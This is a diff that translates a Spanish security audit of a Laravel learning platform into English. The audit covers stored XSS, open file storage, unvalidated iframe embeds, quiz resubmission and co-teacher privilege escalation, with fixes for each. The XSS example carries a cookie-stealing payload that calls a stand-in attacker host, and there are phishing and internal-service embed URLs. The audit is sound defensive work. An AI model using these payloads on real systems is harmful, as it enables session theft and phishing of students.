+Each vulnerability is documented in full — description, evidence, exploitation example and impact, and remediation — before moving to the next.
 
 ---
 
-### V1 — XSS almacenado en contenido de lecciones (A03: Injection)
+### V1 — Stored XSS in lesson content (A03: Injection)
 
-**Severidad:** Crítica  
-**Historias afectadas:** HU-2, HU-8  
-**Estado:** Detectada en código actual
+**Severity:** Critical  
+**Affected user stories:** HU-2, HU-8  
+**Status:** Detected in current code
 
-#### Descripción
+#### Description
 
-El editor de lecciones permite al profesor guardar HTML enriquecido (Quill) dentro del campo JSON `content`. La vista del estudiante renderiza ese HTML con directivas Blade **sin escapar** (`{!! !!}`), lo que convierte cualquier fragmento malicioso en XSS almacenado ejecutable en el navegador de todos los alumnos matriculados.
+The lesson editor allows the teacher to save rich HTML (Quill) inside the JSON `content` field. The student view renders that HTML with **unescaped** Blade directives (`{!! !!}`), turning any malicious fragment into stored XSS executable in the browser of all enrolled students.
 
-#### Evidencia en código
+#### Code evidence
 
-En `resources/views/lessons/show.blade.php`, el contenido de página y los bloques de texto se inyectan tal cual:
+In `resources/views/lessons/show.blade.php`, page content and text blocks are injected as-is:
 
 ```blade
 <div class="ql-editor">{!! $page['html'] ?? '' !!}</div>
@@ -326,57 +326,57 @@ En `resources/views/lessons/show.blade.php`, el contenido de página y los bloqu
 <div class="ql-editor">{!! $block['value'] ?? '' !!}</div>
 ```
 
-El profesor persiste ese HTML vía `LessonController::updateContent`, que acepta el array `pages` sin sanitización HTML:
+The teacher persists that HTML via `LessonController::updateContent`, which accepts the `pages` array without HTML sanitization:
 
 ```php
 $lesson->update(['content' => $validated['pages']]);
 ```
 
-#### Ejemplo concreto de explotación
+#### Concrete exploitation example
 
-1. Un profesor (o un atacante que comprometa su cuenta) edita una lección y en el editor Quill inserta en modo HTML:
+1. A teacher (or an attacker who compromises their account) edits a lesson and inserts the following in Quill HTML mode:
    ```html
-   <img src=x onerror="fetch('https://atacante.evil/log?c='+document.cookie)">
+   <img src=x onerror="fetch('https://attacker.evil/log?c='+document.cookie)">
    ```
-2. Guarda el contenido (`PATCH /lessons/{id}/content`).
-3. Cualquier estudiante matriculado abre `/lessons/{id}`.
-4. El script se ejecuta en el contexto de la sesión del estudiante → robo de cookie de sesión, acciones en nombre del usuario o redirección a phishing.
+2. They save the content (`PATCH /lessons/{id}/content`).
+3. Any enrolled student opens `/lessons/{id}`.
+4. The script runs in the context of the student's session → session cookie theft, actions on behalf of the user, or phishing redirect.
 
-**Por qué es la vulnerabilidad más importante:** afecta a **todos** los consumidores del contenido (HU-8), el vector es persistente (almacenado en BD) y el impacto es ejecución de código en el cliente con privilegios del estudiante autenticado.
+**Why this is the most important vulnerability:** it affects **all** content consumers (HU-8), the vector is persistent (stored in the database), and the impact is client-side code execution with authenticated student privileges.
 
-#### Impacto
+#### Impact
 
-| Dimensión | Efecto |
+| Dimension | Effect |
 |-----------|--------|
-| Confidencialidad | Robo de sesión, exfiltración de datos visibles en la página |
-| Integridad | Acciones no autorizadas vía JavaScript (envío de quiz, cambio de perfil si no hay protección adicional) |
-| Disponibilidad | Defacement de la interfaz de lección |
+| Confidentiality | Session theft, exfiltration of data visible on the page |
+| Integrity | Unauthorized actions via JavaScript (quiz submission, profile changes if no additional protection) |
+| Availability | Defacement of the lesson interface |
 
-#### Solución propuesta
+#### Proposed remediation
 
-1. **Sanitizar en servidor al guardar:** integrar una librería de whitelist HTML (p. ej. `HTMLPurifier` o `stevebauman/purify`) en `UpdateLessonContentRequest` / `LessonController::updateContent`, permitiendo solo etiquetas seguras (`p`, `b`, `i`, `ul`, `li`, `a[href]`, `img[src]` sin event handlers).
-2. **Escapar al renderizar como defensa en profundidad:** sustituir `{!! !!}` por `{{ }}` donde el contenido deba ser texto plano; donde se requiera HTML, pasar siempre por el mismo sanitizador en la vista:
+1. **Sanitize on save on the server:** integrate an HTML whitelist library (e.g. `HTMLPurifier` or `stevebauman/purify`) in `UpdateLessonContentRequest` / `LessonController::updateContent`, allowing only safe tags (`p`, `b`, `i`, `ul`, `li`, `a[href]`, `img[src]` without event handlers).
+2. **Escape on render as defense in depth:** replace `{!! !!}` with `{{ }}` where content must be plain text; where HTML is required, always pass through the same sanitizer in the view:
    ```blade
    <div class="ql-editor">{!! clean($page['html'] ?? '') !!}</div>
    ```
-3. **Cabecera CSP** en respuestas de lección: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';` para bloquear scripts inline residual.
-4. **Test de regresión:** test Feature que cree una lección con `<script>alert(1)</script>` y verifique que la salida renderizada no contiene `<script>`.
+3. **CSP header** on lesson responses: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';` to block residual inline scripts.
+4. **Regression test:** Feature test that creates a lesson with `<script>alert(1)</script>` and verifies the rendered output does not contain `<script>`.
 
 ---
 
-### V2 — Acceso directo a archivos subidos sin autorización (A01: Broken Access Control)
+### V2 — Unauthorized direct access to uploaded files (A01: Broken Access Control)
 
-**Severidad:** Alta  
-**Historias afectadas:** HU-4, HU-8  
-**Estado:** Detectada en código actual
+**Severity:** High  
+**Affected user stories:** HU-4, HU-8  
+**Status:** Detected in current code
 
-#### Descripción
+#### Description
 
-Los vídeos de lecciones y los assets de plugins se almacenan en el disco `public` de Laravel (`storage/app/public`). El enlace generado (`/storage/plugin-assets/{id}/…` o `/storage/lesson-content/{id}/…`) es **público y predecible**, sin comprobar si quien descarga el fichero está autenticado o matriculado en el curso.
+Lesson videos and plugin assets are stored on Laravel's `public` disk (`storage/app/public`). The generated link (`/storage/plugin-assets/{id}/…` or `/storage/lesson-content/{id}/…`) is **public and predictable**, without checking whether the downloader is authenticated or enrolled in the course.
 
-#### Evidencia en código
+#### Code evidence
 
-En `PluginController::uploadAsset`:
+In `PluginController::uploadAsset`:
 
 ```php
 $path = $file->store('plugin-assets/'.$instance->id, 'public');
@@ -384,63 +384,63 @@ $path = $file->store('plugin-assets/'.$instance->id, 'public');
 'uri' => '/storage/'.$path,
 ```
 
-En `LessonController::uploadContentVideo`:
+In `LessonController::uploadContentVideo`:
 
 ```php
 $path = $request->file('file')->store('lesson-content/'.$lesson->id, 'public');
 return response()->json(['url' => asset('storage/'.$path)]);
 ```
 
-Nginx sirve `/storage/` como fichero estático; no interviene `LessonPolicy::viewAsStudent`.
+Nginx serves `/storage/` as static files; `LessonPolicy::viewAsStudent` is not involved.
 
-#### Ejemplo concreto de explotación
+#### Concrete exploitation example
 
-1. Un estudiante matriculado sube o visualiza una lección con vídeo local y obtiene la URL:
+1. An enrolled student uploads or views a lesson with a local video and obtains the URL:
    `http://localhost:8080/storage/lesson-content/3/abc123.mp4`
-2. Comparte la URL por chat o la extrae del HTML de la página.
-3. Un usuario **no autenticado** (o un estudiante **no matriculado** en ese curso) abre la URL directamente en el navegador.
-4. El vídeo se descarga/reproduce sin ninguna comprobación de sesión ni matriculación.
+2. They share the URL via chat or extract it from the page HTML.
+3. An **unauthenticated** user (or a student **not enrolled** in that course) opens the URL directly in the browser.
+4. The video downloads/plays with no session or enrollment check.
 
-**Justificación:** viola el principio de mínimo privilegio de HU-8 (solo alumnos matriculados deberían acceder al material) y expone material educativo restringido o PII en grabaciones.
+**Justification:** violates the least-privilege principle of HU-8 (only enrolled students should access material) and exposes restricted educational content or PII in recordings.
 
-#### Impacto
+#### Impact
 
-| Dimensión | Efecto |
+| Dimension | Effect |
 |-----------|--------|
-| Confidencialidad | Fuga de contenido de cursos, vídeos privados, documentos PDF/DOCX subidos como plugin |
-| Integridad | No altera datos, pero facilita distribución no autorizada |
-| Disponibilidad | Posible hotlinking y agotamiento de ancho de banda |
+| Confidentiality | Leakage of course content, private videos, PDF/DOCX documents uploaded as plugins |
+| Integrity | Does not alter data, but facilitates unauthorized distribution |
+| Availability | Possible hotlinking and bandwidth exhaustion |
 
-#### Solución propuesta
+#### Proposed remediation
 
-1. **Almacenar en disco privado** (`local` o `s3` con bucket no público), no en `public`:
+1. **Store on private disk** (`local` or `s3` with non-public bucket), not on `public`:
    ```php
    $path = $file->store('plugin-assets/'.$instance->id, 'local');
    ```
-2. **Ruta de descarga controlada** con autorización:
+2. **Controlled download route** with authorization:
    ```php
    Route::get('/media/{asset}', [MediaController::class, 'show'])
        ->middleware('auth')
        ->name('media.show');
    ```
-   En el controlador: resolver el asset, cargar la lección asociada y `Gate::authorize('viewAsStudent', $lesson)` (o `update` para profesor).
-3. **URLs firmadas y temporales** (Laravel `Storage::temporaryUrl`) para S3, o tokens HMAC con expiración para servidores locales.
-4. **Renombrar ficheros** con UUID (ya parcialmente cubierto por Laravel `store()`); no incluir `original_name` en la ruta pública.
-5. **Test:** petición GET a `/storage/lesson-content/1/x.mp4` sin cookie de sesión debe devolver 403 o 404 tras el cambio.
+   In the controller: resolve the asset, load the associated lesson, and `Gate::authorize('viewAsStudent', $lesson)` (or `update` for the teacher).
+3. **Signed temporary URLs** (Laravel `Storage::temporaryUrl`) for S3, or HMAC tokens with expiration for local servers.
+4. **Rename files** with UUID (partially covered by Laravel `store()`); do not include `original_name` in the public path.
+5. **Test:** GET request to `/storage/lesson-content/1/x.mp4` without session cookie must return 403 or 404 after the change.
 
 ---
 
-### V3 — URLs de embed sin validar en plugins (A03: Injection / contenido embebido malicioso)
+### V3 — Unvalidated embed URLs in plugins (A03: Injection / malicious embedded content)
 
-**Severidad:** Alta  
-**Historias afectadas:** HU-4, HU-8  
-**Estado:** Detectada en código actual
+**Severity:** High  
+**Affected user stories:** HU-4, HU-8  
+**Status:** Detected in current code
 
-#### Descripción
+#### Description
 
-Los plugins `video_embed` y `h5p_embed` insertan la URL configurada por el profesor directamente en un `<iframe>` o `<video>`, sin lista blanca de dominios ni validación de esquema. El riesgo es **contenido embebido malicioso** en el navegador del usuario: **iframes de phishing**, **clickjacking** y carga de páginas internas no previstas dentro del contexto visual del LMS. No hay petición servidor-a-servidor; el backend no realiza fetch de esas URLs.
+The `video_embed` and `h5p_embed` plugins insert the URL configured by the teacher directly into an `<iframe>` or `<video>`, without domain whitelisting or scheme validation. The risk is **malicious embedded content** in the user's browser: **phishing iframes**, **clickjacking**, and loading unexpected internal pages within the LMS visual context. There is no server-to-server request; the backend does not fetch those URLs.
 
-#### Evidencia en código
+#### Code evidence
 
 `resources/views/plugins/_h5p_embed.blade.php`:
 
@@ -448,70 +448,70 @@ Los plugins `video_embed` y `h5p_embed` insertan la URL configurada por el profe
 <iframe src="{{ $settings['embed_url'] ?? '' }}" ...></iframe>
 ```
 
-`resources/views/plugins/_video_embed.blade.php` — si la URL no es YouTube/Vimeo/local, se usa tal cual:
+`resources/views/plugins/_video_embed.blade.php` — if the URL is not YouTube/Vimeo/local, it is used as-is:
 
 ```blade
 <iframe src="{{ $embedUrl }}" width="100%" height="400" ...></iframe>
 ```
 
-`PluginController::update` acepta `settings_json` como array libre sin validar campos por tipo de plugin.
+`PluginController::update` accepts `settings_json` as a free-form array without validating fields by plugin type.
 
-#### Ejemplo concreto de explotación
+#### Concrete exploitation example
 
-**Escenario A — Phishing embebido**
+**Scenario A — Embedded phishing**
 
-1. Profesor (o cuenta comprometida) configura un plugin `video_embed` con URL:
-   `https://falso-login-lms.evil/clone-dashboard`
-2. Los estudiantes ven un iframe a página de phishing dentro del entorno LMS de confianza.
-3. Mayor tasa de éxito en robo de credenciales por contexto visual legítimo.
+1. A teacher (or compromised account) configures a `video_embed` plugin with URL:
+   `https://fake-lms-login.evil/clone-dashboard`
+2. Students see a phishing iframe page within the trusted LMS environment.
+3. Higher success rate for credential theft due to the legitimate visual context.
 
-**Escenario B — Iframe hacia servicio interno (solo lado cliente)**
+**Scenario B — Iframe to internal service (client-side only)**
 
-1. Profesor configura `h5p_embed` con:
-   `http://phpmyadmin:80` o `http://localhost:8082` (phpMyAdmin del `docker-compose.yml`).
-2. El navegador del estudiante (o del profesor en preview) carga el iframe contra el panel de administración de BD expuesto en desarrollo.
-3. Si el servicio interno no requiere auth adicional, se expone la interfaz de gestión en el contexto del LMS (riesgo de confidencialidad en el cliente, no SSRF en servidor).
+1. A teacher configures `h5p_embed` with:
+   `http://phpmyadmin:80` or `http://localhost:8082` (phpMyAdmin from `docker-compose.yml`).
+2. The student's browser (or the teacher's in preview) loads the iframe against the exposed database admin panel in development.
+3. If the internal service requires no additional auth, the management interface is exposed in the LMS context (client-side confidentiality risk, not server-side SSRF).
 
-**Justificación:** el contenido del iframe se presenta bajo la apariencia del LMS; en entornos Docker la combinación con [A05 Security Misconfiguration](#v2--acceso-directo-a-archivos-subidos-sin-autorización-a01-broken-access-control) amplifica el riesgo.
+**Justification:** iframe content is presented under the appearance of the LMS; in Docker environments the combination with [A05 Security Misconfiguration](#v2--unauthorized-direct-access-to-uploaded-files-a01-broken-access-control) amplifies the risk.
 
-#### Impacto
+#### Impact
 
-| Dimensión | Efecto |
+| Dimension | Effect |
 |-----------|--------|
-| Confidencialidad | Phishing de credenciales; posible acceso visual a consolas internas |
-| Integridad | Contenido engañoso mostrado como material oficial del curso |
-| Disponibilidad | Iframes a recursos pesados pueden degradar la experiencia |
+| Confidentiality | Credential phishing; possible visual access to internal consoles |
+| Integrity | Deceptive content displayed as official course material |
+| Availability | Iframes to heavy resources may degrade the experience |
 
-#### Solución propuesta
+#### Proposed remediation
 
-1. **Validar `settings_json` por slug de plugin** en `PluginController::update` / `store` con reglas dedicadas:
+1. **Validate `settings_json` by plugin slug** in `PluginController::update` / `store` with dedicated rules:
    ```php
    // video_embed
    'settings_json.url' => ['required', 'url', 'regex:/^https:\/\/(www\.)?(youtube\.com|youtu\.be|vimeo\.com)\//'],
    // h5p_embed
    'settings_json.embed_url' => ['required', 'url', 'starts_with:https://h5p.org/'],
    ```
-2. **Rechazar** URLs con esquemas `javascript:`, `data:`, IPs privadas (RFC 1918), `localhost`, `127.0.0.1` y metadatos cloud (`169.254.169.254`).
-3. **Atributo `sandbox`** en iframes de terceros:
+2. **Reject** URLs with schemes `javascript:`, `data:`, private IPs (RFC 1918), `localhost`, `127.0.0.1`, and cloud metadata (`169.254.169.254`).
+3. **`sandbox` attribute** on third-party iframes:
    ```blade
    <iframe src="{{ $embedUrl }}" sandbox="allow-scripts allow-same-origin" ...>
    ```
-4. **Transformar URLs** a formato embed solo para dominios permitidos (como ya hace YouTube/Vimeo); para cualquier otro dominio → rechazar.
-5. **Test Feature:** profesor intenta guardar plugin con `embed_url=http://127.0.0.1:8082` → respuesta 422.
+4. **Transform URLs** to embed format only for allowed domains (as YouTube/Vimeo already do); for any other domain → reject.
+5. **Feature test:** teacher attempts to save a plugin with `embed_url=http://127.0.0.1:8082` → 422 response.
 
 ---
 
-### V4 — Integridad del quiz comprometida (A04: Insecure Design / A08: Integrity Failures)
+### V4 — Compromised quiz integrity (A04: Insecure Design / A08: Integrity Failures)
 
-**Severidad:** Media-Alta  
-**Historias afectadas:** HU-9, HU-10  
-**Estado:** Detectada en código actual
+**Severity:** Medium-High  
+**Affected user stories:** HU-9, HU-10  
+**Status:** Detected in current code
 
-#### Descripción
+#### Description
 
-El endpoint `POST /quiz/submit` recalcula la puntuación en servidor (correcto), pero **no limita el número de intentos** ni impide sobrescribir el progreso. Cada envío crea un nuevo `QuizResult` y marca la lección como completada incondicionalmente.
+The `POST /quiz/submit` endpoint recalculates the score on the server (correct), but **does not limit the number of attempts** or prevent progress overwrite. Each submission creates a new `QuizResult` and unconditionally marks the lesson as completed.
 
-#### Evidencia en código
+#### Code evidence
 
 `QuizController::submit`:
 
@@ -529,59 +529,59 @@ Progress::updateOrCreate(
 );
 ```
 
-No existe restricción `unique(user_id, lesson_id)` en `quiz_results` ni comprobación de intento previo. `SubmitQuizRequest` solo exige `lesson_id` y `answers` — no valida que las claves de `answers` correspondan a IDs de pregunta de la lección (más allá del cálculo que ignora IDs desconocidos).
+No `unique(user_id, lesson_id)` constraint exists on `quiz_results` nor prior attempt check. `SubmitQuizRequest` only requires `lesson_id` and `answers` — it does not validate that `answers` keys correspond to question IDs in the lesson (beyond calculation that ignores unknown IDs).
 
-#### Ejemplo concreto de explotación
+#### Concrete exploitation example
 
-1. Estudiante abre lección con quiz de 5 preguntas y envía respuestas aleatorias → score 1/5.
-2. Repite `POST /quiz/submit` con distintas combinaciones (automatizable con script).
-3. En el intento N acierta todas → score 5/5.
-4. Cada intento ejecuta `Progress::updateOrCreate` → la lección queda **completada** incluso con puntuación baja en intentos anteriores.
-5. Un informe de progreso (HU-10) mostrará la lección como completada independientemente de la política académica de aprobación.
+1. A student opens a lesson with a 5-question quiz and submits random answers → score 1/5.
+2. They repeat `POST /quiz/submit` with different combinations (automatable with a script).
+3. On attempt N they get all correct → score 5/5.
+4. Each attempt runs `Progress::updateOrCreate` → the lesson is marked **completed** even with a low score on earlier attempts.
+5. A progress report (HU-10) will show the lesson as completed regardless of the academic pass policy.
 
-**Variante:** enviar `answers` vacío o con IDs inventados — el score es 0 pero el progreso igualmente se marca completado, falseando el seguimiento.
+**Variant:** submit empty `answers` or invented IDs — score is 0 but progress is still marked completed, falsifying tracking.
 
-#### Impacto
+#### Impact
 
-| Dimensión | Efecto |
+| Dimension | Effect |
 |-----------|--------|
-| Confidencialidad | Bajo (no filtra respuestas correctas directamente; las opciones ya están en el HTML) |
-| Integridad | **Alto** — puntuaciones y progreso no fiables para evaluación académica |
-| Disponibilidad | Reenvíos masivos pueden generar carga en BD (`quiz_results`) |
+| Confidentiality | Low (does not directly leak correct answers; options are already in the HTML) |
+| Integrity | **High** — unreliable scores and progress for academic assessment |
+| Availability | Mass resubmissions may generate database load (`quiz_results`) |
 
-#### Solución propuesta
+#### Proposed remediation
 
-1. **Política de intentos** en `QuizController::submit`:
+1. **Attempt policy** in `QuizController::submit`:
    ```php
    $attempts = QuizResult::where('user_id', $user->id)
        ->where('lesson_id', $lesson->id)->count();
-   abort_if($attempts >= 3, 422, 'Máximo de intentos alcanzado');
+   abort_if($attempts >= 3, 422, 'Maximum attempts reached');
    ```
-2. **Restricción de unicidad** según regla de negocio — migración:
+2. **Uniqueness constraint** per business rule — migration:
    ```sql
-   UNIQUE (user_id, lesson_id)  -- si solo se permite un intento
+   UNIQUE (user_id, lesson_id)  -- if only one attempt is allowed
    ```
-   o tabla `quiz_attempts` con número de intento y mejor puntuación.
-3. **Validar claves de respuestas** en `SubmitQuizRequest`:
+   or a `quiz_attempts` table with attempt number and best score.
+3. **Validate answer keys** in `SubmitQuizRequest`:
    ```php
    'answers' => ['required', 'array', new AnswersMatchLessonQuestions($lesson)],
    ```
-4. **Desacoplar progreso de envío:** marcar `completed_at` solo si `score / total >= umbral` (p. ej. 0.6) o tras primer envío válido según política documentada.
-5. **Test Feature:** dos envíos consecutivos con política de 1 intento → segundo devuelve 422; progreso no se marca si score < umbral.
+4. **Decouple progress from submission:** set `completed_at` only if `score / total >= threshold` (e.g. 0.6) or after the first valid submission per documented policy.
+5. **Feature test:** two consecutive submissions with a 1-attempt policy → second returns 422; progress is not marked if score < threshold.
 
 ---
 
-### V5 — Escalada de privilegios en matriculación (A01: Broken Access Control)
+### V5 — Privilege escalation in enrollment (A01: Broken Access Control)
 
-**Severidad:** Media  
-**Historias afectadas:** HU-6  
-**Estado:** Detectada en código actual
+**Severity:** Medium  
+**Affected user stories:** HU-6  
+**Status:** Detected in current code
 
-#### Descripción
+#### Description
 
-El panel de matriculaciones permite al gestor del curso asignar usuarios con `role: teacher` además de `student`. Un profesor propietario puede añadir **cualquier usuario del sistema con rol teacher global** como co-docente del curso, otorgándole permisos de gestión (`canManageCourse`) sobre contenido, matriculaciones y publicación.
+The enrollment panel allows the course manager to assign users with `role: teacher` in addition to `student`. A course owner can add **any system user with the global teacher role** as a co-teacher of the course, granting them management permissions (`canManageCourse`) over content, enrollments, and publication.
 
-#### Evidencia en código
+#### Code evidence
 
 `EnrollmentController::enroll`:
 
@@ -597,7 +597,7 @@ CourseEnrollment::updateOrCreate(
 );
 ```
 
-`User::canManageCourse` concede gestión si el usuario está matriculado con pivot `role = teacher`:
+`User::canManageCourse` grants management if the user is enrolled with pivot `role = teacher`:
 
 ```php
 return $this->enrolledCourses()
@@ -606,38 +606,38 @@ return $this->enrolledCourses()
     ->exists();
 ```
 
-#### Ejemplo concreto de explotación
+#### Concrete exploitation example
 
-1. Profesor A crea el curso «Ingeniería de Software» (curso id=5).
-2. Desde `/courses/5/enrollments`, arrastra al profesor B (`teacher@example.com`) al panel de matriculados con `role: teacher`.
-3. Profesor B (que no creó el curso) accede a `/courses/5`, edita lecciones, matricula alumnos y publica/despublica el curso.
-4. Si Profesor A es eliminado o deja la institución, Profesor B mantiene control total sin ser el `user_id` propietario.
+1. Teacher A creates the course "Software Engineering" (course id=5).
+2. From `/courses/5/enrollments`, they drag Teacher B (`teacher@example.com`) into the enrolled panel with `role: teacher`.
+3. Teacher B (who did not create the course) accesses `/courses/5`, edits lessons, enrolls students, and publishes/unpublishes the course.
+4. If Teacher A is removed or leaves the institution, Teacher B retains full control without being the owner `user_id`.
 
-**Justificación:** HU-6 describe asignación de usuarios al curso, pero no prevé que un docente pueda delegar **permisos de gestión** a terceros sin controles adicionales; esto es escalada horizontal de privilegios a nivel de recurso.
+**Justification:** HU-6 describes assigning users to a course, but does not anticipate that a teacher can delegate **management permissions** to third parties without additional controls; this is horizontal privilege escalation at the resource level.
 
-#### Impacto
+#### Impact
 
-| Dimensión | Efecto |
+| Dimension | Effect |
 |-----------|--------|
-| Confidencialidad | Co-docentes no autorizados acceden a borradores y listados de alumnos |
-| Integridad | Terceros pueden alterar contenido, quizzes y matriculaciones |
-| Disponibilidad | Publicar/despublicar curso por actor no previsto |
+| Confidentiality | Unauthorized co-teachers access drafts and student lists |
+| Integrity | Third parties can alter content, quizzes, and enrollments |
+| Availability | Course publish/unpublish by an unexpected actor |
 
-#### Solución propuesta
+#### Proposed remediation
 
-1. **Restringir roles en matriculación** al caso de uso HU-6 (solo estudiantes), salvo flujo explícito de «añadir co-docente»:
+1. **Restrict enrollment roles** to the HU-6 use case (students only), unless an explicit "add co-teacher" flow exists:
    ```php
-   'role' => ['required', 'in:student'],  // endpoint enroll por defecto
+   'role' => ['required', 'in:student'],  // default enroll endpoint
    ```
-2. **Endpoint separado** `POST /courses/{course}/co-teachers` protegido por política `CoursePolicy::inviteTeacher`, limitado al propietario (`user_id`) o rol `Admin`.
-3. **Auditoría obligatoria** en `course_enrollments` con `invited_by_user_id` y notificación al usuario añadido.
-4. **Límite de co-docentes** por curso y confirmación explícita en UI («X podrá editar y publicar este curso»).
-5. **Test Feature:** profesor no propietario intenta `POST /courses/{id}/enrollments` con `role: teacher` → 403.
+2. **Separate endpoint** `POST /courses/{course}/co-teachers` protected by `CoursePolicy::inviteTeacher`, limited to the owner (`user_id`) or `Admin` role.
+3. **Mandatory audit** on `course_enrollments` with `invited_by_user_id` and notification to the added user.
+4. **Co-teacher limit** per course and explicit UI confirmation ("X will be able to edit and publish this course").
+5. **Feature test:** non-owner teacher attempts `POST /courses/{id}/enrollments` with `role: teacher` → 403.
 
 ---
 
-## Referencias
+## References
 
 - [OWASP Top 10 (2021)](https://owasp.org/Top10/)
-- Código fuente analizado: [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (rama `angel-burgos-r`)
-- Controles globales: [readme.md § 2.5](./readme.md#25-seguridad)
+- Analyzed source code: [BurgosAngel/codigofinal](https://github.com/BurgosAngel/codigofinal/tree/angel-burgos-r/codigofinal/lms-cms-laravel12) (`angel-burgos-r` branch)
+- Global controls: [readme.md § 2.5](./readme.md#25-security)
